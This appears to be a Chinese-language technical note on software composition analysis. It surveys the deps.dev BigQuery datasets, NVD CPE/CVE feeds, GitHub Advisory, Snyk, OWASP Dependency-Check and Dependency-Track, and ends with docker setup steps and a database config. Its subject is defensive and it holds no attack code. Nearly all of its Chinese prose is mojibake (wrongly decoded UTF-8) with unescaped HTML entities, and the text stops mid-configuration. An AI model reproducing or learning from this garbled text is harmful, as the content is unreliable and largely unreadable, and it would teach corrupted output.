Insightsæ˜¯è°·æ­Œçš„ä¸€é¡¹å®éªŒé¡¹ç›®ï¼Œç”±Google äº‘å¹³å°æä¾›ã€‚æä¾›npmã€Mavenã€PyPiã€NuGutã€Goç­‰è¯­è¨€çš„å¼€æºè½¯ä»¶åŒ…æŸ¥è¯¢ã€‚æŸ¥è¯¢ç»“æœåŒ…æ‹¬é¡¹ç›®ä¿¡æ¯ï¼š\n\né¡¹ç›®æè¿°\nlinkè¿æ¥\nrepo\nhomepage\norgin\n\n\nç‰ˆæœ¬ä¿¡æ¯\nå¼€æºåè®®\näº‹ä»¶å†å²é¡¹ç›®å®‰å…¨ä¿¡æ¯ï¼š\nå®‰å…¨å…¬å‘Š\nç‰ˆæœ¬æ¯”è¾ƒ\nDependents\nDependencies\n\n\nåŒæ—¶ï¼Œæä¾›å…¬å…±æ•°æ®é›†ï¼Œå¯ä»¥ä½¿ç”¨BigQueryæŸ¥è¯¢åˆ†æä½¿ç”¨ï¼Œå½“ç„¶å¦‚æœä¸è€ƒè™‘ç½‘ç»œçš„é—®é¢˜ä¹Ÿå¯ä»¥ä½¿ç”¨Grafanaæ­å»ºåˆ†æè§†å›¾Grafanaçš„bigqueryæ’ä»¶ç±»ä¼¼Linuxå¼€æºåŸºé‡‘ä¼šæ›¾ç»çš„ä¸€ä¸ªé¡¹ç›®metricsè¿›é˜¶-&gt;:è°·æ­Œ bigquery é…ç½®ä»£ç†\nbigquery-public-data.deps_dev_v1.ProjectsThe type of the project, example values include â€˜APACHE_JIRAâ€™, â€˜BITBUCKETâ€™, â€˜GITHUBâ€™ and â€˜GITLABâ€™.\nbigquery-public-data.deps_dev_v1.PackageVersions\nbigquery-public-data.deps_dev_v1.Dependencies\nbigquery-public-data.deps_dev_v1.Advisories\nlicenseæŸ¥è¯¢æŸ¥è¯¢ç»“æœ\n&#123; &quot;System&quot;: &quot;CARGO&quot;, &quot;License&quot;: &quot;MIT&quot;, &quot;NPackages&quot;: &quot;36775&quot;&#125;\n\n&#123; &quot;System&quot;: &quot;CARGO&quot;, &quot;License&quot;: &quot;Apache-2.0 OR MIT&quot;, &quot;NPackages&quot;: &quot;22671&quot;&#125;\n\n&#123; &quot;System&quot;: &quot;CARGO&quot;, &quot;License&quot;: &quot;Apache-2.0&quot;, &quot;NPackages&quot;: &quot;9958&quot;&#125;\n\n&#123; &quot;System&quot;: &quot;GO&quot;, &quot;License&quot;: &quot;MIT&quot;, &quot;NPackages&quot;: &quot;216790&quot;&#125;\n\n&#123; &quot;System&quot;: &quot;GO&quot;, &quot;License&quot;: &quot;Apache-2.0&quot;, &quot;NPackages&quot;: &quot;108678&quot;&#125;\n\n&#123; &quot;System&quot;: &quot;GO&quot;, &quot;License&quot;: &quot;BSD-3-Clause&quot;, &quot;NPackages&quot;: &quot;28823&quot;&#125;\n\n&#123; &quot;System&quot;: &quot;MAVEN&quot;, &quot;License&quot;: &quot;Apache-2.0&quot;, &quot;NPackages&quot;: &quot;263361&quot;&#125;\n\n&#123; &quot;System&quot;: &quot;MAVEN&quot;, &quot;License&quot;: &quot;MIT&quot;, &quot;NPackages&quot;: &quot;75302&quot;&#125;\n\n&#123; &quot;System&quot;: &quot;MAVEN&quot;, &quot;License&quot;: &quot;non-standard&quot;, &quot;NPackages&quot;: &quot;68080&quot;&#125;\n\n&#123; &quot;System&quot;: &quot;NPM&quot;, &quot;License&quot;: &quot;MIT&quot;, &quot;NPackages&quot;: &quot;3229651&quot;&#125;\n\n&#123; &quot;System&quot;: &quot;NPM&quot;, &quot;License&quot;: &quot;ISC&quot;, &quot;NPackages&quot;: &quot;1003365&quot;&#125;\n\n&#123; &quot;System&quot;: &quot;NPM&quot;, &quot;License&quot;: &quot;Apache-2.0&quot;, &quot;NPackages&quot;: &quot;235446&quot;&#125;\n\n&#123; &quot;System&quot;: &quot;PYPI&quot;, &quot;License&quot;: &quot;MIT&quot;, &quot;NPackages&quot;: &quot;105168&quot;&#125;\n\n&#123; &quot;System&quot;: &quot;PYPI&quot;, &quot;License&quot;: &quot;non-standard&quot;, &quot;NPackages&quot;: &quot;50207&quot;&#125;\n\n&#123; &quot;System&quot;: &quot;PYPI&quot;, &quot;License&quot;: &quot;Apache-2.0&quot;, &quot;NPackages&quot;: &quot;22749&quot;&#125;\nCPEå¼€æ”¾æ•°æ®CPECPEï¼ˆCommon Platform Enumerationï¼ŒCPEå›½å®¶æ¼æ´æ•°æ®åº“ï¼‰æ•°æ®åº“æ˜¯ä¸€ä¸ªåŒ…å«äº§å“ã€å…¶ç‰ˆæœ¬ã€ä¾›åº”å•†ç­‰ä¿¡æ¯çš„åˆ—è¡¨ã€‚è¦å®ç°SCAï¼Œå¿…é¡»è·å¾—CPEå’ŒCVEçš„é€šä¿¡ä¿¡æ¯ã€‚\nCPEå’ŒCVEæ•°æ®-APIåœ¨å®˜æ–¹ç½‘ç«™å›½å®¶è„†å¼±æ€§æ•°æ®åº“ä¸Šæ‰¾åˆ°CPEæ•°æ®åº“å’ŒCVEåˆè§„æ€§ã€‚è·å–å¿…è¦ä¿¡æ¯çš„æ–¹æ³•ä¹‹ä¸€æ˜¯ä½¿ç”¨Rest APIã€‚è¿™é‡Œæè¿°äº†å®ƒã€‚ä¾‹å¦‚ï¼Œä»¥ä¸‹æŸ¥è¯¢å…è®¸æˆ‘ä»¬è·å–CPEæ•°æ®åº“çš„å‰20ä¸ªå…ƒç´ ï¼ŒåŒ…æ‹¬ç›¸åº”çš„CVEï¼šæµ‹è¯•ä»¥ä¸‹æ˜¯ActivePerlçš„CPEç¤ºä¾‹ï¼š\n&#123; &quot;deprecated&quot;: false, &quot;cpe23Uri&quot;: &quot;cpe:2.3:a:activestate:activeperl:-:*:*:*:*:*:*:*&quot;, &quot;lastModifiedDate&quot;: &quot;2007-09-14T17:36Z&quot;, &quot;titles&quot;: [ &#123; &quot;title&quot;: &quot;ActiveState ActivePerl&quot;, &quot;lang&quot;: &quot;en_US&quot; &#125; ], &quot;refs&quot;: [], &quot;deprecatedBy&quot;: [], &quot;vulnerabilities&quot;: [ &quot;CVE-2001-0815&quot;, &quot;CVE-2004-0377&quot; ] &#125;\nè¿™é‡Œæœ€é‡è¦çš„éƒ¨åˆ†æ˜¯â€œcpe23Uriâ€å€¼ã€‚å®ƒä»¥æŸç§æ ¼å¼ä¸ºæˆ‘ä»¬æä¾›äº†é‡è¦ä¿¡æ¯ï¼Œå½“ç„¶è¿˜æœ‰â€œæ¼æ´â€ï¼ˆå°½ç®¡å®ƒä»¬ä¸æ˜¯CPEåˆ—è¡¨çš„ä¸€éƒ¨åˆ†ï¼‰ã€‚ä¸ºäº†ç®€å•èµ·è§ï¼Œæˆ‘ä»¬å°†â€œcpe23Uriâ€å­—ç¬¦ä¸²è¯»ä½œ\ncpe:2.3:a:&lt;vendor&gt;:&lt;product&gt;:&lt;version&gt;:&lt;update&gt;:...\næ ¹æ®è§„èŒƒï¼Œä»£æ›¿å…¶ä¸­ä¸€ä¸ªç‰‡æ®µçš„è¿å­—ç¬¦æ„å‘³ç€é€»è¾‘â€œNAâ€å€¼ã€‚è¿™å¯ä»¥è§£é‡Šä¸ºâ€œå€¼æœªè®¾ç½®â€ã€‚ä»£æ›¿ç‰‡æ®µçš„â€œ*â€å­—ç¬¦æ„å‘³ç€â€œä»»ä½•â€ã€‚\nå½“æˆ‘ä»¬å®ç°åŸºäºCPEçš„è§£å†³æ–¹æ¡ˆæ—¶ï¼Œä¸»è¦å›°éš¾æ˜¯ä¸ºæ¯ä¸ªä¾èµ–é¡¹æ‰¾åˆ°æ­£ç¡®çš„å…ƒç´ ã€‚è¿™é‡Œçš„é—®é¢˜æ˜¯ï¼Œåº“åç§°ï¼ˆåœ¨æˆ‘ä»¬è§£æé¡¹ç›®é“¾æ¥æ—¶è·å¾—ï¼‰å¯èƒ½ä¸ç›¸åº”çš„CPEæ¡ç›®ä¸åŒ¹é…ã€‚ä¾‹å¦‚ï¼ŒCPEåˆ—è¡¨æœ‰ä»¥ä¸‹â€œcpe23Uriâ€çš„æ¡ç›®ï¼š\ncpe:2.3:a:microsoft:asp.net_model_view_controller:2.0:*:*:*:*:*:*:* cpe:2.3:a:microsoft:asp.net_model_view_controller:3.0:*:*:*:*:*:*:* cpe:2.3:a:microsoft:asp.net_model_view_controller:4.0:*:*:*:*:*:*:* cpe:2.3:a:microsoft:asp.net_model_view_controller:5.0:*:*:*:*:*:*:* cpe:2.3:a:microsoft:asp.net_model_view_controller:5.1:*:*:*:*:*:*:*\n\n\n\n\n\n\n\n\n\nè¦æ£€æµ‹ jar åŒ…å­˜åœ¨çš„æ¼æ´ï¼Œé¦–å…ˆè¦æœ‰å‡†ç¡®ä¸”è¶³å¤Ÿå…¨çš„æ¼æ´åº“ï¼Œæœ€å¥½èƒ½å¤Ÿå¥‘åˆ maven åæ ‡ã€‚NVD æ¼æ´æœ€å…¨ï¼Œä½†ä»¥ cpe æ ¼å¼æ ‡è¯†æ¼æ´çš„å½±å“è½¯ä»¶ï¼Œä½¿å¾—å»ºç«‹ cpe å’Œ maven åæ ‡çš„å¯¹åº”å…³ç³»æ¯”è¾ƒéº»çƒ¦ã€‚ DependencyCheck(https://github.com/jeremylong/DependencyCheck) åŸºäº NVD æ¼æ´åº“é€šè¿‡è®¡ç®—ç›¸ä¼¼åº¦æ¥å…³è”ä¾èµ–å’Œ cpeï¼Œä¸å¯é¿å…çš„ä¼šå­˜åœ¨è¯¯æŠ¥å’Œæ¼æŠ¥ã€‚\nCPEå’ŒCVEæ•°æ®-æ•°æ®æºæ•°æ®æºNVD - Data Feeds\n\nCPE:Â https://nvd.nist.gov/feeds/xml/cpe/dictionary/official-cpe-dictionary_v2.3.xml.gz\nCWE:Â https://cwe.mitre.org/data/xml/cwec_latest.xml.zip\nCVE:\nhttps://nvd.nist.gov/feeds/json/cve/1.1/nvdcve-1.1-2021.json.gz\nhttps://nvd.nist.gov/feeds/json/cve/1.1/nvdcve-1.1-2020.json.gz\nhttps://nvd.nist.gov/feeds/json/cve/1.1/nvdcve-1.1-2019.json.gz\n[â€¦]\nhttps://nvd.nist.gov/feeds/json/cve/1.1/nvdcve-1.1-2002.json.gz\n\n\n\nAPIå’Œæ•°æ®æºç±»å‹åè¯è§£é‡Š\n\n1.æ¼æ´åº“ï¼šå³æ¼æ´æ•°æ®åº“ï¼Œä¸»è¦æ˜¯åªå¤§å‹çš„ã€å…¬å¼€çš„ã€ä¸šç•Œå…¬è®¤çš„æ¼æ´æ•°æ®åº“ã€‚æ¯”å¦‚NVDã€CNVDã€exploit-dbç­‰ã€‚\n2.CVEÂ ï¼šå³ä¸ºæ¯ä¸ªæ¼æ´ç¡®å®šäº†å”¯ä¸€çš„åç§°ï¼Œé€šè¿‡å®ƒèƒ½å¸®åŠ©å®‰å…¨ä»ä¸šäººå‘˜å¿«é€Ÿåœ°åœ¨æ¼æ´æ•°æ®åº“ä¸­æ‰¾åˆ°ç›¸åº”çš„æ¼æ´ä¿¡æ¯ã€‚\n3.CPEÂ ï¼šå³æ¼æ´æ‰€å…³è”çš„äº§å“ã€ç‰ˆæœ¬ã€ä¾èµ–è·¯å¾„æˆ–å‘½åè§„èŒƒç­‰ä¿¡æ¯ï¼Œé€šè¿‡æ­¤ä¿¡æ¯ï¼Œå¯ä»¥çŸ¥é“æŸä¸ªCVEæ‰€å½±å“çš„ç»„ä»¶ç‰ˆæœ¬å’Œæ‰€åœ¨äº§å“çš„ä¾èµ–è·¯å¾„ã€‚\n4.CWEÂ ï¼šå³æ¼æ´çš„ç±»å‹ï¼Œæ¯”å¦‚æŸ3ä¸ªç»„ä»¶éƒ½å­˜åœ¨SQLæ³¨å…¥æ¼æ´ï¼Œè¿™3ä¸ªæ¼æ´çš„CVEå¹¶ä¸ç›¸åŒï¼Œä½†CWEéƒ½å¯æè¿°ä¸ºCWE-89Â SQLæ³¨å…¥ç±»å‹çš„æ¼æ´ã€‚\n5.CVSSÂ ï¼šå³é€šç”¨æ¼æ´è¯„åˆ†ç³»ç»Ÿï¼Œé€šè¿‡å¯¹æ¼æ´è¿›è¡Œè¯„åˆ†ï¼Œæ¥å®šä¹‰å¨èƒçš„é«˜ã€ä¸­ã€ä½ä»¥ä¾¿åŒºåˆ«ï¼Œè¾…åŠ©åˆ¶å®šæ¼æ´ä¿®å¤ç­–ç•¥ã€‚\n\n\n\n\nç±»å‹\næè¿°\n\n\n\nCVEå’ŒCPE API\nä¼ ç»Ÿæ¼æ´æ•°æ®æè¦æ–‡ä»¶çš„æ›¿ä»£å“ã€‚ä¸JSONæ¼æ´æè¦å’ŒCPEåŒ¹é…æè¦ç›¸æ¯”ï¼ŒAPIè¦çµæ´»å¾—å¤šï¼Œåœ¨å•ä¸ªç•Œé¢ä¸­æä¾›äº†æ›´ä¸°å¯Œçš„æ•°æ®é›†ã€‚\n\n\nJSONè„†å¼±æ€§ä¿¡æ¯\næ–‡ä»¶ä¸­çš„æ¯ä¸ªæ¼æ´éƒ½åŒ…æ‹¬æ¥è‡ªCVEÂ®è¯å…¸æè¦çš„æè¿°å’Œç›¸å…³å‚è€ƒé“¾æ¥ï¼Œä»¥åŠCVSSåŸºæœ¬åˆ†æ•°ã€æ˜“å—æ”»å‡»çš„äº§å“é…ç½®å’Œå¼±ç‚¹åˆ†ç±»ã€‚\n\n\nCPEæ¯”èµ›Feed\næ ¹æ®å®˜æ–¹CPEè¯å…¸ä¸­çš„CPEåŒ¹é…æä¾›äº§å“&#x2F;å¹³å°é€‚ç”¨æ€§å£°æ˜åˆ°CPE URIåŒ¹é…çš„æè¦ã€‚\n\n\nRSSæ¼æ´Feed\nå…«å¤©çš„å®‰å…¨ç›¸å…³è½¯ä»¶ç¼ºé™·çª—å£ã€‚\n\n\næ¼æ´ç¿»è¯‘Feed\næ¼æ´æè¦çš„ç¿»è¯‘ã€‚\n\n\næ¼æ´ä¾›åº”å•†è¯„è®º\nä¾›åº”å•†å°±å½±å“äº§å“å†…éƒ¨çš„ç‰¹å®šç¼ºé™·æä¾›çš„è¯„è®ºã€‚\n\n\nCPEè¯å…¸\nåŒ…å«äº§å“åˆ—è¡¨çš„è¯å…¸ã€‚\n\n\né€šç”¨é…ç½®æšä¸¾ï¼ˆCCEï¼‰å‚è€ƒæ•°æ®\nå¸¸è§é…ç½®é¡¹çš„å‚è€ƒæ•°æ®ã€‚\n\n\nä½¿ç”¨GitHubå®‰å…¨å…¬å‘ŠadvisoryGitHub Advisoryæ˜¯åœ¨å­˜å‚¨åœ¨GitHubä¸Šçš„å¼€æºé¡¹ç›®ä¸­å‘ç°çš„æ¼æ´æ•°æ®åº“ï¼ˆCVEï¼‰ã€‚GitHub Advisoryæ¯”CPEæ–¹ä¾¿å¾—å¤šï¼Œ[[SCAè½¯ä»¶æˆåˆ†åˆ†æå‰æœŸæ¢ç´¢#google å¼€æºæ´è§]]ä¹Ÿä½¿ç”¨è¯¥æ•°æ®åº“ã€‚Googleå¼€æºè½¯ä»¶æ´è§æ•°æ®åº“å¯¼å‡ºçš„500æ¡advisoryå¦‚ä¸‹ï¼š\nè¦ä»¥ç¼–ç¨‹æ–¹å¼è®¿é—®GitHub Advisoryï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨GraphQL APIæŸ¥è¯¢ã€‚Explorer - GitHub Docs\nsnyk å¼€æºæ¼æ´åº“Snyk Vulnerability Database | Snykå¼€æºæ•°æ®å¯ä»¥è¿›è¡Œæ¼æ´åŠå¼€æºè½¯ä»¶æŸ¥è¯¢,æ”¯æŒå„ç§åŒ…ç®¡ç†å™¨å¦‚Linuxã€mavenã€NPMç­‰ã€‚è¯¥æ¼æ´åº“ä»¥ groupId:artifactId ä½œä¸ºè½¯ä»¶åç§°ï¼Œä»¥ç‰ˆæœ¬åŒºé—´çš„æ–¹å¼è¡¨ç¤ºå½±å“èŒƒå›´ï¼ŒSCA åœ¨æ£€æµ‹æ¼æ´æ—¶ï¼Œä»…éœ€è¦ä» mavenTree ä¸­å–å‡º jar åŒ…ç‰ˆæœ¬ä¸æ¼æ´åº“ä¸­çš„ç‰ˆæœ¬åŒºé—´ä½œæ¯”è¾ƒå³å¯Snyk API Â· ApiaryAPIæ¥å£æ”¯æŒRESTæ¥å£è°ƒç”¨ï¼ŒğŸ“¢APIéœ€è¦å•†ä¸šä»˜è´¹çš„ç”¨æˆ·æˆ–ç»„ç»‡æ‰èƒ½å¤Ÿä½¿ç”¨ï¼Œå…è´¹ä¸ªäººç”¨æˆ·æ— æƒè®¿é—®APIä»˜è´¹è®¡åˆ’\nå¼€æºç¬¬ä¸‰æ–¹å®‰å…¨æ‰«æå·¥å…·SCASonatypeSoftware Supply Chain Security - DevSecOps Governance | SonatypeMaven Central Repository SearchSonatype OSS IndexREST API - The Central Repository Documentation\nOWASP Dependency-CheckOWASP Dependency-Checkæ˜¯ä¸€ä¸ªç”¨äºæ‰«æé¡¹ç›®ä¾èµ–é¡¹çš„SCAå®ç”¨ç¨‹åºï¼Œç”¨äºè¯†åˆ«é¡¹ç›®ä¾èµ–é¡¹å¹¶æ£€æŸ¥æ˜¯å¦å­˜åœ¨ä»»ä½•å·²çŸ¥çš„ã€å…¬å¼€æŠ«éœ²çš„æ¼æ´ï¼›ç›®å‰å·²æ”¯æŒJavaã€Rubyã€.NETã€NodeJsã€Rubyã€Pythonç­‰è¯­è¨€ç¼–å†™çš„ç¨‹åºã€‚å¹¶ä¸ºC&#x2F;C++æ„å»ºç³»ç»Ÿï¼ˆautoconfå’Œcmakeï¼‰æä¾›äº†æœ‰é™çš„æ”¯æŒï¼›å¦å¤–ï¼Œä½œä¸ºä¸€æ¬¾å¼€æºå·¥å…·ï¼Œåœ¨å¤šå¹´æ¥çš„å‘å±•è¿‡ç¨‹ä¸­å·²ç»æ”¯æŒä¸è®¸å¤šä¸»æµè½¯ä»¶è¿›è¡Œé›†æˆï¼Œæ¯”å¦‚Jenkinsç­‰ï¼›å…·å¤‡ä½¿ç”¨æ–¹ä¾¿ã€è½åœ°ç®€å•ç­‰ä¼˜åŠ¿ã€‚Dependency-Checkçš„ä¾èµ–æ€§æ£€æŸ¥å¯ç”¨äºåº”ç”¨ç¨‹åºï¼ˆåŠä¾èµ–åº“ï¼‰ï¼Œæ‰§è¡Œæ£€æŸ¥æ—¶ä¼šå°†Common Platform Enumerationï¼ˆCPEï¼‰å›½å®¶æ¼æ´åº“åŠNPM Public Advisoriesåº“ä¸‹è½½åˆ°æœ¬åœ°ï¼Œå†é€šè¿‡æ ¸å¿ƒå¼•æ“ä¸­çš„ä¸€ç³»åˆ—åˆ†æå™¨æ£€æŸ¥é¡¹ç›®ä¾èµ–æ€§ï¼Œæ”¶é›†æœ‰å…³ä¾èµ–é¡¹ç›®çš„ä¿¡æ¯ï¼Œç„¶åæ ¹æ®æ”¶é›†çš„ä¾èµ–é¡¹ä¿¡æ¯ä¸æœ¬åœ°çš„CPE&amp;NPMåº“æ•°æ®è¿›è¡Œå¯¹æ¯”ï¼Œå¦‚æœæ£€æŸ¥å‘ç°æ‰«æçš„ç»„ä»¶å­˜åœ¨å·²çŸ¥çš„æ˜“å—æ”»å‡»å’Œæ¼æ´åˆ™æ ‡è¯†ï¼Œæœ€åç”ŸæˆæŠ¥å‘Šè¿›è¡Œå±•ç¤ºã€‚\n\nğŸ‘‘é¡¹ç›®åœ°å€GitHub - jeremylong&#x2F;DependencyCheck: OWASP dependency-check is a software composition analysis utility that detects publicly disclosed vulnerabilities in application dependencies.\nğŸ‘WIKIHome Â· jeremylong&#x2F;DependencyCheck Wiki Â· GitHub\nğŸ“’Docsdependency-check â€“ About[[dependency-check]]\n\nOWASP Dependency-TrackOWASP Dependency-Trackæ˜¯ä¸€ä¸ªç»„ä»¶åˆ†æå¹³å°ï¼ŒDependency-Trackæ˜¯OWASPæ¨å‡ºçš„ä¸€ä¸ªæ™ºèƒ½ä¾›åº”é“¾ç»„ä»¶åˆ†æå¹³å°ï¼Œå®ƒé›†æˆäº†4ç§æ¼æ´æ•°æ®åº“ï¼šNPMÂ PublicÂ Advisoriesã€NationalÂ VulnerabilityÂ Databaseã€SonartypeÂ OSSÂ Indexå’ŒVulnDBï¼Œç›¸æ¯”äºå…¶ä»–å¼€æºæ£€æµ‹å·¥å…·å•ä¸€çš„æ¼æ´åº“ï¼ŒDependencyÂ Trackå‡ºç°æ¼æŠ¥æˆ–è€…è¯¯æŠ¥çš„æƒ…å†µä¼šå°å¾ˆå¤šã€‚åŒæ—¶å®ƒæä¾›äº†å¼ºå¤§çš„APIé›†æˆåŠŸèƒ½ï¼ˆå¦‚openAPIå’ŒJenkinsçš„æ’ä»¶ï¼‰ï¼Œåœ¨å¼€å‘å®‰å…¨å»ºè®¾è¿‡ç¨‹ä¸­æˆ‘ä»¬å¯ä»¥å°†å…¶æ•´åˆåˆ°æˆ‘ä»¬çš„pipelineä¸­å¸®åŠ©DevOpså›¢é˜Ÿæé«˜å¼€å‘æµç¨‹é€Ÿåº¦ï¼ŒåŒæ—¶è¿˜èƒ½æ§åˆ¶å¤–éƒ¨ç»„ä»¶çš„ä½¿ç”¨å’Œå®ƒä»¬å¯èƒ½é€ æˆçš„é£é™©ã€‚æ­¤å¤–é€šè¿‡mavenæ”¶é›†ä»“åº“ä¸­æ‰€æœ‰ä¾èµ–åŒ…çš„ä¿¡æ¯ï¼Œè®°å½•å„ä¸ªå¼€å‘å›¢é˜Ÿçš„åº”ç”¨ç¨‹åºæ‰€ä½¿ç”¨çš„å„ç§ç¬¬ä¸‰æ–¹ä¾èµ–ä¿¡æ¯ï¼Œä»¥ä¾¿è¿›è¡Œä¾èµ–åŒ…ç®¡ç†ï¼ˆç‰ˆæœ¬æ§åˆ¶ã€æ¼æ´ç®¡ç†ç­‰ï¼‰ã€‚åœ¨å¼€å‘è¿‡ç¨‹ä¸­å¯ä»¥åŸºäºsonerÂ bugè¿½è¸ªçš„ç»„ä»¶å®‰å…¨è·Ÿè¸ªï¼Œç”šè‡³fortifyè¿™æ ·çš„ä»£ç ç™½ç›’reviewä»‹å…¥ï¼Œå¹¶é€šè¿‡é‚®ä»¶ã€é’‰é’‰å‘Šè­¦é€šçŸ¥å®‰å…¨å›¢é˜Ÿã€å¼€å‘å›¢é˜Ÿã€‚ğŸ‘‘å®˜ç½‘\næ ¸å¿ƒæ¶æ„\næ£€æµ‹åŸç†DependencyÂ Tracké€šè¿‡æ¥æ”¶åˆ°ç”Ÿæˆçš„SoftwareÂ BOM(è½¯ä»¶ç‰©æ–™æ¸…å•)[[è½¯ä»¶ç‰©æ–™æ¸…å•SBOM]]ï¼Œç„¶åæ£€æŸ¥ç‰©æ–™æ¸…å•ä¸­çš„å„ä¸ªç»„ä»¶(ä»¥åŠå½“å‰æ¸…å•ä¸­çš„ç‰ˆæœ¬)åœ¨æ¼æ´æ•°æ®åº“ä¸­æ˜¯å¦å­˜åœ¨å·²çŸ¥å®‰å…¨æ¼æ´çš„è®°å½•ï¼Œå¹¶é€šè¿‡Dashboardå±•ç¤ºå‡ºæ¥ã€‚æ‰€ä»¥ä½ éœ€è¦å…ˆå‡†å¤‡å¥½ä¸€ä»½SBOMæ¸…å•ï¼Œç„¶åå‘é€ç»™DependencyÂ Trackï¼Œç­‰å¾…å®ƒå®Œæˆæ‰«ææ£€æµ‹ä¹‹åï¼Œç„¶ååœ¨ç®¡ç†ç•Œé¢ä¸ŠæŸ¥çœ‹ç»“æœã€‚\n\n\n\n\n\n\n\n\n\nSBOMï¼ˆSoftwareÂ BillÂ ofÂ Materialï¼‰ç¿»è¯‘ä¹‹åç§°ä¸ºè½¯ä»¶ç‰©æ–™æ¸…å•ã€‚é€šä¿—çš„è§£é‡Šå°±æ˜¯æˆ‘ä»¬ç”¨åˆ°çš„æ‰€æœ‰ç¬¬ä¸‰æ–¹ç»„ä»¶ä¾èµ–ï¼ˆåŒ…æ‹¬ç¬¬ä¸‰æ–¹ç»„ä»¶è‡ªå·±æ‰€ä¾èµ–çš„å…¶ä»–ç¬¬ä¸‰æ–¹ç»„ä»¶ï¼Œæ¢å¥è¯è®²ï¼Œä¾èµ–çš„ä¾èµ–ï¼‰çš„ä¿¡æ¯æ¸…å•ï¼Œè¿™äº›å†…å®¹åŒ…æ‹¬authorã€group,Â licenses,Â versionsÂ andÂ copyrightç­‰æ•°æ®ã€‚\n\n\n\nå­—æ®µ\nSPDXå€¼\nSWIDå€¼\n\n\n\nä¾›åº”å•†\nï¼ˆ3.5ï¼‰ PackageSupplier:\n @role (softwareCreator&#x2F;publisher),@name\n\n\nç»„ä»¶\nï¼ˆ3.1ï¼‰PackageName:\n @name\n\n\nå”¯ä¸€æ ‡è¯†\nï¼ˆ3.2ï¼‰SPDXID:\n @tagID\n\n\nç‰ˆæœ¬\nï¼ˆ3.3ï¼‰PackageVersion:\n @version\n\n\nç»„ä»¶æ•£åˆ—å€¼\nï¼ˆ3.10ï¼‰PackageChecksum:\n&#x2F;..&#x2F;@[hash-algorithm]:hash\n\n\nç›¸äº’å…³ç³»\nï¼ˆ7.1ï¼‰Relationship:CONTAINS\n@rel,@href\n\n\nSBOMç¼–è¾‘äºº\nï¼ˆ2.8ï¼‰Creator:\n @role (tagCreator),@name\n\n\nç”ŸæˆSBOMçš„å·¥å…·æœ‰å‡ ä¸ªï¼Œå…¶ä¸­æ¯”è¾ƒæœ‰åçš„æ˜¯CycloneDXOWASP CycloneDX Software Bill of Materials (SBOM) Standardæ˜¯ä¸€ä¸ªè½»é‡çº§è½¯ä»¶ææ–™æ¸…å•ï¼ˆSBOMï¼‰æ ‡å‡†ã€‚ä¸€æ—¦æˆ‘ä»¬æœ‰äº†BOMæ–‡ä»¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‰‹åŠ¨æˆ–é€šè¿‡æ•´åˆCI&#x2F;CDä¸­çš„ä¸Šä¼ åŠŸèƒ½å°†å…¶ä¸Šä¼ åˆ°Dependency-Trackã€‚DependencyÂ trackç›¸å½“äºä¸€ä¸ªæ¼æ´åº“å’Œåˆ†æå¼•æ“ï¼Œå®ƒåŸºäºSBOMï¼Œåœ¨æ¼æ´åº“ä¸­æœç´¢ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è·å¾—æ¯”ä¼ ç»Ÿç»„ä»¶åˆ†ææ›´å®Œæ•´ã€æ›´å¤æ‚çš„ä¿¡æ¯ã€‚\nDependencyÂ TrackÂ VSÂ DependencyÂ check\nDependencyCheckæ›´å¤šæ˜¯ç»™å¼€å‘å›¢é˜Ÿä½¿ç”¨çš„å·¥å…·\nDependencyTrackæ›´å¤šçš„æ˜¯ç»™å®‰å…¨å›¢é˜Ÿä½¿ç”¨çš„å·¥å…·\nä¼ä¸šæˆ–è€…ç»„ç»‡ä¸­çš„å®‰å…¨å›¢é˜Ÿå¯ä»¥å€ŸåŠ©DependencyTrackå®ç°ç¬¬ä¸‰æ–¹ç»„ä»¶çš„ç»Ÿä¸€å®‰å…¨ç®¡ç†\nDependencyCheckåªèƒ½å¯¹ç¬¬ä¸‰æ–¹ç»„ä»¶åšå®‰å…¨æ£€æµ‹å¹¶ç”ŸæˆæŠ¥å‘Šï¼Œä»…æ­¤è€Œå·²\nDependencyTrackä¼šä¿å­˜å†æ¬¡ç¬¬ä¸‰æ–¹ç»„ä»¶å®‰å…¨æ£€æµ‹ç»“æœï¼Œä½ å¯ä»¥é€šè¿‡Dashboardäº†è§£æˆ–è€…è¿½è¸ªç¬¬ä¸‰æ–¹ç»„ä»¶çš„å®‰å…¨å˜åŒ–è¶‹åŠ¿\nDependencyTrackè¿˜æä¾›äº†å¾ˆå¤šé¢å¤–çš„åŠŸèƒ½ï¼Œä¾‹å¦‚æ¼æ´é€šçŸ¥ã€å…¨å±€å®¡æŸ¥ç¬¬ä¸‰æ–¹ç»„ä»¶ã€å®¡è®¡ç¬¬ä¸‰æ–¹ç»„ä»¶è½¯ä»¶æˆæƒåè®®ã€APIç­‰ç­‰\n\néƒ¨ç½²DependencyCheckæ”¯æŒ3ç§éƒ¨ç½²æ–¹å¼ï¼Œåˆ†åˆ«æ˜¯å®¹å™¨åŒ–éƒ¨ç½²ã€è‡ªè¿è¡Œå®‰è£…åŒ…ï¼Œä»¥åŠå¯ä»¥ç›´æ¥åœ¨Tomcaté‡Œè¿è¡Œçš„WebAppåŒ…ã€‚dockeréƒ¨ç½²\n#Â ä¸‹è½½DependencyTracké•œåƒ\n\ndockerÂ pullÂ owasp&#x2F;dependency-track\n\n#Â åˆ›å»ºå¹¶ä½¿ç”¨å®¿ä¸»æœºä¸Šçš„å­˜å‚¨ä»¥é¿å…æ•°æ®ä¸¢å¤±\ndockerÂ volumeÂ createÂ --nameÂ dependency-track\n\n#Â åœ¨8080ç«¯å£ä¸Šè¿è¡ŒDependencyTrackï¼Œé»˜è®¤è´¦æˆ·å¯†ç admin&#x2F;admin\ndockerÂ runÂ -dÂ -mÂ 8192mÂ -pÂ 8080:8080Â --nameÂ dependency-trackÂ -vÂ dependency-track:&#x2F;dataÂ owasp&#x2F;dependency-track\næ›´æ¢æ•°æ®åº“ï¼ˆå¯é€‰ï¼‰\n# 1.æ ¹è·¯å¾„æ–°å»ºdependency-trackç›®å½•ï¼Œç„¶ååœ¨è¯¥ç›®å½•ä¸‹æ–°å»ºapplication.propertiesæ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶ä¸­å¡«å†™ä¸‹é¢é…ç½®\n\nalpine.database.mode&#x3D;external\n\nalpine.database.url&#x3D;jdbc:postgresql:&#x2F;&#x2F;localhost:5432&#x2F;dtrack\n\nalpine.database.driver&#x3D;org.postgresql.Driver\n\nalpine.database.username&#x3D;dtrack\n\nalpine.database.password&#x3D;password\n\n# 